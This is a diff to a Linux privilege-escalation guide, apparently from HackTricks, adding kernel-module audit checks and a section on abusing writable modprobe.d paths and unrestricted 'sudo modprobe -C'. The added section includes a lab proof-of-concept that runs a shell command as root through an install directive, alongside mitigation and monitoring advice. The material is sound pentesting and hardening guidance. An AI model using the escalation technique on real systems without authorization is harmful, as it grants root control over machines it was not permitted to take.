@@ -9,7 +9,7 @@ Kernel module support is a high-impact area during Linux privilege escalation re
 - Can the current user load modules through `sudo`, capabilities, or a writable helper path?
 - Is module loading still enabled?
 - Is module signature enforcement disabled?
-- Are module directories or module files writable?
+- Are module directories, module files, or `modprobe.d` configuration paths writable?<sup>[[16]](#references)</sup>
 - Can kernel logs be read to confirm what happened?
 
 Quick triage starts with the following module-status, signature, logging, and module-tree checks.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>
@@ -19,6 +19,7 @@ uname -a
 uname -r
 cat /proc/sys/kernel/modules_disabled 2>/dev/null
 grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
+grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
 grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
 cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
 dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
@@ -49,7 +50,7 @@ sudo rmmod example
 dmesg | tail -n 30
 ```
 
-If `sudo -l` allows `insmod`, `modprobe`, or a wrapper around them, treat it as critical: `sudo -l` lists the invoking user's privileges, and loading a kernel module requires `CAP_SYS_MODULE`.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>
+If `sudo -l` allows `insmod`, `modprobe`, or a wrapper around them, treat it as critical: `sudo -l` lists the invoking user's privileges, and loading a kernel module requires `CAP_SYS_MODULE`. See [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) for direct capability-based paths.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>
 
 ```bash
 sudo -l
@@ -115,7 +116,7 @@ sudo rmmod demo
 
 ### `kernel.modprobe` / `modprobe_path` abuse checks
 
-`kernel.modprobe` names the userspace helper the kernel executes for module autoload requests; this sysctl affects autoloading, not explicit module insertion. If an attacker can change it to a writable executable path and trigger a module request, that helper becomes a privileged code-execution path.<sup>[[1]](#references)</sup>
+`kernel.modprobe` names the userspace helper the kernel executes for module autoload requests; this sysctl affects autoloading, not explicit module insertion. If an attacker can change it to a writable executable path and trigger a module request, that helper becomes a privileged code-execution path. Setting it to the empty string disables autoload requests; if `CONFIG_STATIC_USERMODEHELPER=y`, a non-empty value is overridden by the compiled-in static helper path.<sup>[[1]](#references)</sup>
 
 Check the current helper path through the kernel sysctl interface and inspect the target's ownership and mode.<sup>[[1]](#references)</sup>
 
@@ -150,6 +151,37 @@ cat /tmp/modprobe-helper-ran 2>/dev/null
 
 On hardened systems, this should fail when permissions prevent unprivileged writes to `kernel.modprobe`, the helper path is not writable, or module autoloading is disabled.<sup>[[1]](#references)</sup>
 
+### Writable `modprobe.d` configuration and `sudo modprobe -C`
+
+Before resolving a module, `modprobe` reads `.conf` files from configuration directories such as `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d`, and `/lib/modprobe.d`, in precedence order. A same-named file in a higher-priority directory shadows the lower-priority file. More importantly, an `install <module> <command>` directive runs an arbitrary shell command **instead of** inserting that module. Therefore, a writable configuration path can become delayed command execution under the credentials of a later privileged `modprobe` caller; kernel module signature enforcement does not authenticate this userspace command.<sup>[[16]](#references)</sup>
+
+Audit directory and file permissions, then inspect the effective configuration. `modprobe -n -v` is safe for resolution review because dry-run mode neither inserts the module nor executes an `install`/`remove` command. Prefer `modprobe -c` over the legacy `--showconfig` spelling, which current kmod documentation marks for removal after kmod 36.<sup>[[8]](#references)[[16]](#references)</sup>
+
+```bash
+for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
+    [ -e "$d" ] || continue
+    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
+done
+
+grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
+  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
+  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
+modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
+modprobe -n -v <module_name>
+```
+
+An unrestricted sudo rule for `modprobe` is exploitable even when arbitrary `.ko` files cannot pass signature verification: `-C` selects an attacker-controlled configuration directory, from which an `install` command can be executed by the sudo-launched process.<sup>[[8]](#references)[[16]](#references)</sup>
+
+```bash
+# Authorized lab proof for an unrestricted `sudo modprobe` rule
+D="$(mktemp -d)"
+printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
+sudo /sbin/modprobe -C "$D" ht_probe
+cat /tmp/ht-modprobe-id
+```
+
+For mitigation, do not grant argument-unrestricted `modprobe` through sudo, keep every configuration directory root-owned and non-writable, and review unexpected `install`/`remove` directives. When a trusted administrative workflow must bypass such directives for one module, `modprobe --ignore-install` ignores them for that named module, but dependencies can still have their own commands.<sup>[[8]](#references)[[16]](#references)</sup>
+
 ### Writable `/lib/modules` review
 
 Writable module directories can allow module replacement, malicious module planting, or auto-load abuse depending on how `modprobe` is later invoked; `modprobe` searches `/lib/modules/$(uname -r)` and uses its dependency data when resolving modules.<sup>[[8]](#references)</sup>
@@ -176,7 +208,9 @@ Defensive notes:
 - Keep `/lib/modules` owned by `root:root` and non-writable by users.<sup>[[8]](#references)</sup>
 - Set `kernel.modules_disabled=1` after boot where operationally possible.<sup>[[1]](#references)</sup>
 - Enforce module signing on systems that require loadable modules.<sup>[[2]](#references)</sup>
-- Monitor writes to `/proc/sys/kernel/modprobe`, `/lib/modules`, and unexpected `insmod`/`modprobe` execution.<sup>[[1]](#references)[[8]](#references)</sup>
+- Monitor writes to `/proc/sys/kernel/modprobe`, `/lib/modules`, and the `modprobe.d` configuration directories, plus unexpected `insmod`/`modprobe` execution.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>
+
+
 
 ## References
 
@@ -195,5 +229,5 @@ Defensive notes:
 - [13] [lsmod(8) — Linux manual page](https://man7.org/linux/man-pages/man8/lsmod.8.html)
 - [14] [rmmod(8) — Linux manual page](https://man7.org/linux/man-pages/man8/rmmod.8.html)
 - [15] [getcap(8) — Linux manual page](https://man7.org/linux/man-pages/man8/getcap.8.html)
-
+- [16] [modprobe.d(5) — Linux manual page](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
 {{#include ../../banners/hacktricks-training.md}}
